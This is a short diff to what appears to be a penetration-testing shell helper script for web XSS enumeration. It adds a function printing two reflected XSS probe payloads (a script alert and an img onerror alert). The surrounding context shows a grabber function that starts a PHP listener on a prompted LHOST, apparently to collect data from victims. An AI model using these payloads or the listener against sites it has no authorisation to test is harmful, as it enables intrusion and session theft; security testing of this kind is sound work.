@@ -4,6 +4,17 @@
 # qq-enum-web-xss
 #############################################################
 
+qq-enum-xss-reflected() {
+echo $(cat << END 
+
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
+
+END
+)
+}
+
+
 qq-enum-web-xss-grabber-host() {
     local l && read "l?LHOST: "
 
@@ -18,7 +29,6 @@ EOF
 
     print -z "php -S ${l}:80"
 }
-
 
 qq-enum-web-xss-grabber-payloads(){
 echo $(cat << END 
